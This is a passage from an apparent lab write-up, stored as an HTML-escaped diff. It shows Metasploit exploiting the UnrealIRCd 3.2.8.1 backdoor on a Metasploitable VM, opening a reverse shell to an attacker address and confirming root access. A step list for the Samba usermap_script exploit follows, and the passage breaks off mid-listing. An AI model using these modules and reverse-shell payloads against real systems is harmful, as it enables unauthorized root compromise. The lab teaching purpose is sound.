+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show payloads
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Compatible &lt;span class="nv">Payloads&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Name Disclosure Date Rank Check Description&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> payload/cmd/unix/adduser normal No Add user with useradd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2&lt;/span> payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via perl&lt;span class="o">)&lt;/span> IPv6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3&lt;/span> payload/cmd/unix/bind_ruby normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">4&lt;/span> payload/cmd/unix/bind_ruby_ipv6 normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span> IPv6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">5&lt;/span> payload/cmd/unix/generic normal No Unix Command, Generic Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6&lt;/span> payload/cmd/unix/reverse normal No Unix Command Shell, Double Reverse TCP &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7&lt;/span> payload/cmd/unix/reverse_bash_telnet_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8&lt;/span> payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9&lt;/span> payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">10&lt;/span> payload/cmd/unix/reverse_ruby normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">11&lt;/span> payload/cmd/unix/reverse_ruby_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">12&lt;/span> payload/cmd/unix/reverse_ssl_double_telnet normal No Unix Command Shell, Double Reverse TCP SSL &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> payload cmd/unix/reverse
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; cmd/unix/reverse
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CHOST no The &lt;span class="nb">local&lt;/span> client address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CPORT no The &lt;span class="nb">local&lt;/span> client port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port&lt;span class="o">[&lt;/span>,type:host:port&lt;span class="o">][&lt;/span>...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS 10.0.3.18 yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">6667&lt;/span> yes The target port &lt;span class="o">(&lt;/span>TCP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload options &lt;span class="o">(&lt;/span>cmd/unix/reverse&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LHOST yes The listen address &lt;span class="o">(&lt;/span>an interface may be specified&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LPORT &lt;span class="m">4444&lt;/span> yes The listen port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Automatic Target
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> LHOST 10.0.3.10
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.3.10
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; exploit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Started reverse TCP double handler on 10.0.3.10:4444
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.3.18:6667 - Connected to 10.0.3.18:6667...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn&lt;span class="err">&amp;#39;&lt;/span>t resolve your hostname&lt;span class="p">;&lt;/span> using your IP address instead
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.3.18:6667 - Sending backdoor command...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Accepted the first client connection...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Accepted the second client connection...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Command: &lt;span class="nb">echo&lt;/span> wZz1QexVwG7uNLHr&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Writing to socket A
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Writing to socket B
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Reading from sockets...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Reading from socket B
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> B: &lt;span class="s2">&amp;#34;wZz1QexVwG7uNLHr\r\n&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Matching...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> A is input...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Command shell session &lt;span class="m">1&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.3.10:4444 -&amp;gt; 10.0.3.18:37500&lt;span class="o">)&lt;/span> at 2024-11-27 06:09:42 +0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sessions -i &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Wrong number of arguments expected: 1, received: &lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Usage: sessions &amp;lt;id&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interact with a different session Id.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">This &lt;span class="nb">command&lt;/span> only accepts one positive numeric argument.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">This works the same as calling this from the MSF shell: sessions -i &amp;lt;session id&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux metasploitable 2.6.24-16-server &lt;span class="c1">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The output indicates that you have successfully exploited the vulnerability in the UnrealIRCD 3.2.8.1 service using Metasploit. Here’s a breakdown of the key information from the output:&lt;/p>
+&lt;p>Target Details&lt;/p>
+&lt;pre>&lt;code>• IP Address: 10.0.3.18
+• Port: 6667 (IRC service)
+&lt;/code>&lt;/pre>
+&lt;p>Exploit Success&lt;/p>
+&lt;pre>&lt;code>• Exploit Module: exploit/unix/irc/unreal_ircd_3281_backdoor
+• Vulnerability: Backdoor in UnrealIRCD 3.2.8.1, a known issue.
+• Confirmation: The command shell session was opened with root privileges:
+• Output from whoami: root
+&lt;/code>&lt;/pre>
+&lt;p>Shell Access&lt;/p>
+&lt;pre>&lt;code>• Command Shell Session: Successfully opened.
+• Session Info:
+• Attacker Machine: 10.0.3.10:4444
+• Target Machine: 10.0.3.18:37500
+• Timestamp: The session opened at 2024-11-27 06:09:42 +0000.
+• System Info:
+• Output from uname -a:
+&lt;/code>&lt;/pre>
+&lt;p>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux&lt;/p>
+&lt;p>This successful exploitation demonstrates full control over the target system, including the ability to execute commands as the root user.&lt;/p>
+&lt;h3 id="samba">Samba
+&lt;/h3>&lt;ol>
+&lt;li>search Samba in the metasploit&lt;/li>
+&lt;li>use exploit/multi/samba/usermap_script&lt;/li>
+&lt;li>configure the options
+&lt;ul>
+&lt;li>set RHOSTS &amp;lt;target_ip&amp;gt;&lt;/li>
+&lt;li>set RPORT 445&lt;/li>
+&lt;li>set payload cmd/unix/reverse&lt;/li>
+&lt;li>set LHOST &amp;lt;your_ip&amp;gt;&lt;/li>
+&lt;li>set LPORT 4444&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>run the exploit&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;span class="lnt">148
+&lt;/span>&lt;span class="lnt">149
+&lt;/span>&lt;span class="lnt">150
+&lt;/span>&lt;span class="lnt">151
+&lt;/span>&lt;span class="lnt">152
+&lt;/span>&lt;span class="lnt">153
+&lt;/span>&lt;span class="lnt">154
+&lt;/span>&lt;span class="lnt">155
+&lt;/span>&lt;span class="lnt">156
+&lt;/span>&lt;span class="lnt">157
+&lt;/span>&lt;span class="lnt">158
+&lt;/span>&lt;span class="lnt">159
+&lt;/span>&lt;span class="lnt">160
+&lt;/span>&lt;span class="lnt">161
+&lt;/span>&lt;span class="lnt">162
+&lt;/span>&lt;span class="lnt">163
+&lt;/span>&lt;span class="lnt">164
+&lt;/span>&lt;span class="lnt">165
+&lt;/span>&lt;span class="lnt">166
+&lt;/span>&lt;span class="lnt">167
+&lt;/span>&lt;span class="lnt">168
+&lt;/span>&lt;span class="lnt">169
+&lt;/span>&lt;span class="lnt">170
+&lt;/span>&lt;span class="lnt">171
+&lt;/span>&lt;span class="lnt">172
+&lt;/span>&lt;span class="lnt">173
+&lt;/span>&lt;span class="lnt">174
+&lt;/span>&lt;span class="lnt">175
+&lt;/span>&lt;span class="lnt">176
+&lt;/span>&lt;span class="lnt">177
+&lt;/span>&lt;span class="lnt">178
+&lt;/span>&lt;span class="lnt">179
+&lt;/span>&lt;span class="lnt">180
+&lt;/span>&lt;span class="lnt">181
+&lt;/span>&lt;span class="lnt">182
+&lt;/span>&lt;span class="lnt">183
+&lt;/span>&lt;span class="lnt">184
+&lt;/span>&lt;span class="lnt">185
+&lt;/span>&lt;span class="lnt">186
+&lt;/span>&lt;span class="lnt">187
+&lt;/span>&lt;span class="lnt">188
+&lt;/span>&lt;span class="lnt">189
+&lt;/span>&lt;span class="lnt">190
+&lt;/span>&lt;span class="lnt">191
+&lt;/span>&lt;span class="lnt">192
+&lt;/span>&lt;span class="lnt">193
+&lt;/span>&lt;span class="lnt">194
+&lt;/span>&lt;span class="lnt">195
+&lt;/span>&lt;span class="lnt">196
+&lt;/span>&lt;span class="lnt">197
+&lt;/span>&lt;span class="lnt">198
+&lt;/span>&lt;span class="lnt">199
+&lt;/span>&lt;span class="lnt">200
+&lt;/span>&lt;span class="lnt">201
+&lt;/span>&lt;span class="lnt">202
+&lt;/span>&lt;span class="lnt">203
+&lt;/span>&lt;span class="lnt">204
+&lt;/span>&lt;span class="lnt">205
+&lt;/span>&lt;span class="lnt">206
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; search samba
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching &lt;span class="nv">Modules&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Name Disclosure Date Rank Check Description&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> exploit/unix/webapp/citrix_access_gateway_exec 2010-12-21 excellent Yes Citrix Access Gateway Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> exploit/windows/license/calicclnt_getconfig 2005-03-02 average No Computer Associates License Client GETCONFIG Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2&lt;/span> exploit/unix/misc/distcc_exec 2002-02-01 excellent Yes DistCC Daemon Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3&lt;/span> exploit/windows/smb/group_policy_startup 2015-01-26 manual No Group Policy Script Execution From Shared Resource
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">4&lt;/span> post/linux/gather/enum_configs normal No Linux Gather Configurations
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">5&lt;/span> auxiliary/scanner/rsync/modules_list normal No List Rsync Modules
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6&lt;/span> exploit/windows/fileformat/ms14_060_sandworm 2014-10-14 excellent No MS14-060 Microsoft Windows OLE Package Manager Code Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7&lt;/span> exploit/unix/http/quest_kace_systems_management_rce 2018-05-31 excellent Yes Quest KACE Systems Management Command Injection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8&lt;/span> exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba &lt;span class="s2">&amp;#34;username map script&amp;#34;&lt;/span> Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9&lt;/span> exploit/multi/samba/nttrans 2003-04-07 average No Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">10&lt;/span> exploit/linux/samba/setinfopolicy_heap 2012-04-10 normal Yes Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">11&lt;/span> auxiliary/admin/smb/samba_symlink_traversal normal No Samba Symlink Directory Traversal
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">12&lt;/span> auxiliary/scanner/smb/smb_uninit_cred normal Yes Samba _netr_ServerPasswordSet Uninitialized Credential State
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">13&lt;/span> exploit/linux/samba/chain_reply 2010-06-16 good No Samba chain_reply Memory Corruption &lt;span class="o">(&lt;/span>Linux x86&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">14&lt;/span> exploit/linux/samba/is_known_pipename 2017-03-24 excellent Yes Samba is_known_pipename&lt;span class="o">()&lt;/span> Arbitrary Module Load
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15&lt;/span> auxiliary/dos/samba/lsa_addprivs_heap normal No Samba lsa_io_privilege_set Heap Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">16&lt;/span> auxiliary/dos/samba/lsa_transnames_heap normal No Samba lsa_io_trans_names Heap Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">17&lt;/span> exploit/linux/samba/lsa_transnames_heap 2007-05-14 good Yes Samba lsa_io_trans_names Heap Overflow
